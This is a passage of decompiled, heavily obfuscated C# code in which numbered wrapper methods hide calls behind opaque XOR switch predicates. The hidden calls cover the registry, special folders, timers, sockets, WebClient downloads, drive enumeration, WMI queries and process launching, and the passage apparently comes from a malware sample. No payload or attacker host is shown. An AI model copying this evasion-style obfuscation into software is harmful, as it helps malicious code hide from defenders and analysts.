	internal static string smethod_8(Environment.SpecialFolder specialFolder_0, int int_0, char char_0)
	{
		int num = 0;
		string result = (((char_0 ^ int_0) - 103) ^ 0) switch
		{
			0 => (string)(ICloneable)Class11.Class12.smethod_15(specialFolder_0, '\u0336', 'ͽ'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static RegistryProxy smethod_9<T>(T gparam_0, int int_0, int int_1) where T : ServerComputer
	{
		int num = 0;
		RegistryProxy result = (RegistryProxy)((((int_1 ^ int_0) - 49) ^ 0) switch
		{
			0 => Class11.Class12.Class14.smethod_20<ServerComputer>((ServerComputer)(object)gparam_0, (short)440, 407), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static RegistryKey smethod_10<T, U>(T gparam_0, U gparam_1, bool bool_0, char char_0, int int_0) where T : RegistryKey where U : string
	{
		int num = 0;
		RegistryKey result = (((char_0 ^ int_0) - 17) ^ 0) switch
		{
			0 => (RegistryKey)(MarshalByRefObject)Class11.Class15.smethod_23((RegistryKey)gparam_0, (string)gparam_1, bool_0, (short)150, 173), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_11<T, U, V>(V gparam_0, U gparam_1, T gparam_2, char char_0, char char_1) where T : string where U : string where V : string
	{
		int num = 0;
		string result;
		do
		{
			result = (((char_1 ^ char_0) - 89) ^ num) switch
			{
				1 => (string)(IConvertible)Class11.Class12.Class14.smethod_21((string)gparam_0, (string)gparam_1, (string)gparam_2, 408, 'ǐ'), 
				0 => (string)(IConvertible)Class11.Class12.Class14.smethod_21((string)gparam_0, (string)gparam_1, (string)gparam_2, 314, 'Ž'), 
				_ => null, 
			};
			num++;
		}
		while ((char_1 * char_1 + char_1) % 2 != 0);
		return result;
	}

	internal static void smethod_12<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : System.Timers.Timer where U : ElapsedEventHandler
	{
		int num = 0;
		switch (((char_0 ^ int_0) - 25) ^ 0)
		{
		case 0:
			Class16.smethod_7((System.Timers.Timer)gparam_0, (ElapsedEventHandler)gparam_1, 110, (short)5);
			break;
		}
		num++;
	}

	internal static void smethod_13<T>(T gparam_0, double double_0, char char_0, char char_1) where T : System.Timers.Timer
	{
		int num = 0;
		switch (((char_1 ^ char_0) - 11) ^ 0)
		{
		case 0:
			Class11.Class12.smethod_8((System.Timers.Timer)gparam_0, double_0, '\u0315', '\u0369');
			break;
		}
		num++;
	}

	internal static string smethod_14<T>(T gparam_0, char char_0, short short_0) where T : ComputerInfo
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((short_0 ^ char_0) - 76) ^ num) switch
			{
				1 => Class16.smethod_15<ComputerInfo>((ComputerInfo)(object)gparam_0, (short)729, (short)658), 
				0 => Class16.smethod_15<ComputerInfo>((ComputerInfo)(object)gparam_0, (short)627, (short)569), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static string smethod_15(string[] string_0, int int_0, short short_0)
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_0 ^ int_0) - 44) ^ num) switch
			{
				0 => (string)(IComparable<string>)Class16.smethod_16(string_0, 230, 203), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static int smethod_16<T>(T gparam_0, AppWinStyle appWinStyle_0, bool bool_0, int int_0, char char_0, short short_0) where T : string
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		int result;
		do
		{
			result = (((short_0 ^ char_0) - 28) ^ num) switch
			{
				0 => Class11.Class15.smethod_24((string)gparam_0, appWinStyle_0, bool_0, int_0, 'Ǐ', 'ǖ'), 
				_ => int_0, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static int smethod_17<T>(T gparam_0, int int_0, int int_1, char char_0, int int_2) where T : Random
	{
		int num = 0;
		int result = (((char_0 ^ int_2) - 103) ^ 0) switch
		{
			0 => Class11.Class12.Class14.smethod_22((Random)gparam_0, int_0, int_1, 759, 'ʋ'), 
			_ => int_0, 
		};
		num++;
		return result;
	}

	internal static void smethod_18<T, U, V>(T gparam_0, U gparam_1, V gparam_2, char char_0, short short_0) where T : WebClient where U : string where V : string
	{
		int num = 0;
		do
		{
			switch (((short_0 ^ char_0) - 1) ^ num)
			{
			case 0:
				Class11.Class12.smethod_16((WebClient)gparam_0, (string)gparam_1, (string)gparam_2, 'Ϝ', (short)937);
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static object smethod_19<T, U>(T gparam_0, U gparam_1, char char_0, char char_1) where T : string where U : string
	{
		int num = 0;
		object result = (((char_0 ^ char_1) - 61) ^ 0) switch
		{
			0 => Class11.Class12.smethod_11((string)gparam_0, (string)gparam_1, (short)861, (short)890), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static ManagementObjectEnumerator smethod_20<T>(T gparam_0, char char_0, int int_0) where T : ManagementObjectCollection
	{
		int num = 0;
		ManagementObjectEnumerator result = (ManagementObjectEnumerator)((((int_0 ^ char_0) - 108) ^ 0) switch
		{
			0 => Class11.Class12.smethod_17<ManagementObjectCollection>((ManagementObjectCollection)(object)gparam_0, (short)504, 411), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static void smethod_21<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : Socket where U : EndPoint
	{
		int num = 0;
		switch (((short_0 ^ short_1) - 10) ^ 0)
		{
		case 0:
			Class16.smethod_17((Socket)gparam_0, (EndPoint)gparam_1, 440, (short)406);
			break;
		}
		num++;
	}

	internal static Encoding smethod_22(short short_0, int int_0)
	{
		int num = 0;
		Encoding result;
		int num2;
		do
		{
			result = (((short_0 ^ int_0) - 16) ^ num) switch
			{
				0 => Class11.Class15.smethod_25(844, 886), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static DriveInfo[] smethod_23(int int_0, int int_1)
	{
		int num = 0;
		DriveInfo[] result = (((int_0 ^ int_1) - 105) ^ 0) switch
		{
			0 => (DriveInfo[])(IEnumerable)Class11.Class12.Class14.smethod_23(360, 268), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static bool smethod_24<T>(T gparam_0, int int_0, short short_0) where T : DriveInfo
	{
		int num = 0;
		bool result = (((int_0 ^ short_0) - 27) ^ 0) switch
		{
			0 => Class11.smethod_27((DriveInfo)gparam_0, (short)621, 525), 
			_ => false, 
		};
		num++;
		return result;
	}

	internal static string[] smethod_25<T, U>(T gparam_0, U gparam_1, char char_0, char char_1) where T : string where U : string
	{
		int num = 0;
		string[] result;
		do
		{
			result = (((char_0 ^ char_1) - 118) ^ num) switch
			{
				0 => Class16.smethod_18((string)gparam_0, (string)gparam_1, 341, (short)293), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}
}
